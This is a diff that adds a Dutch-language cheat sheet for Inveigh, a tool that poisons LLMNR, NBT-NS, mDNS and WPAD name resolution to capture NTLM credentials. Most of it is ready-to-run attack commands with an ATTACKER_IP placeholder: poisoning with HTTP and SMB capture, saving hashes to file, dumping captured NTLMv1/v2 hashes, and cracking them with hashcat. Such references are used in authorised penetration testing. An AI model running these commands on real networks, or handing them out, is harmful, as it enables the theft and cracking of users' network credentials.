@@ -1,0 +1,56 @@
+# Inveigh — LLMNR/mDNS/NBNS poisoner + NTLM relay (PowerShell)
+# Vangt NTLM hashes op door name resolution poisoning op het lokale netwerk
+#
+# === Syntax ===
+# Invoke-Inveigh [-IP ATTACKER_IP] [-LLMNR Y] [-NBNS Y] [-ConsoleOutput Y]
+#
+# === Werking ===
+# Beantwoordt LLMNR/NBT-NS/mDNS queries met het IP van de aanvaller.
+# Slachtoffers sturen hun NTLM credentials naar de aanvaller.
+# Hashes worden opgeslagen en kunnen offline gekraakt worden.
+#
+# === Belangrijkste opties ===
+# -IP              Listener IP (attacker IP)
+# -LLMNR Y         LLMNR poisoning inschakelen
+# -NBNS Y          NBT-NS poisoning inschakelen
+# -mDNS Y          mDNS poisoning inschakelen
+# -HTTP Y          HTTP server voor NTLM capture
+# -HTTPS Y         HTTPS server inschakelen
+# -SMB Y           SMB capture inschakelen
+# -ConsoleOutput Y Output naar console
+# -FileOutput Y    Hashes opslaan naar bestand
+# -FileOutputDir   Directory voor output bestanden
+# -WPAD Y          WPAD proxy poisoning
+# -WPADAuth NTLM   Authenticatie type voor WPAD
+# -RunTime MIN     Aantal minuten draaien
+#
+# === Voorbeelden ===
+
+# Basis LLMNR + NBNS poisoning met console output
+Invoke-Inveigh -IP ATTACKER_IP -LLMNR Y -NBNS Y -ConsoleOutput Y
+
+# Volledige poisoning met bestandsopslag
+Invoke-Inveigh -IP ATTACKER_IP -LLMNR Y -NBNS Y -HTTP Y -SMB Y -FileOutput Y -ConsoleOutput Y
+
+# Met WPAD poisoning (proxy capture)
+Invoke-Inveigh -IP ATTACKER_IP -LLMNR Y -NBNS Y -WPAD Y -WPADAuth NTLM -ConsoleOutput Y
+
+# Alleen draaien voor 30 minuten
+Invoke-Inveigh -IP ATTACKER_IP -LLMNR Y -NBNS Y -ConsoleOutput Y -RunTime 30
+
+# Opgeslagen hashes bekijken
+Get-Inveigh -NTLMv2
+Get-Inveigh -NTLMv1
+
+# Inveigh stoppen
+Stop-Inveigh
+
+# C# variant (InveighZero / SharpInveigh)
+Inveigh.exe -LLMNR Y -NBNS Y -FileOutput Y
+
+# Hashcat kraken NTLMv2 (mode 5600)
+hashcat -m 5600 inveigh_ntlmv2.txt wordlist.txt
+
+# NOTE: Vereist local admin voor SMB listener (poort 445)
+# NOTE: HTTP listener werkt zonder admin als poort 80 vrij is
+# NOTE: Detecteerbaar door netwerk monitoring / IDS
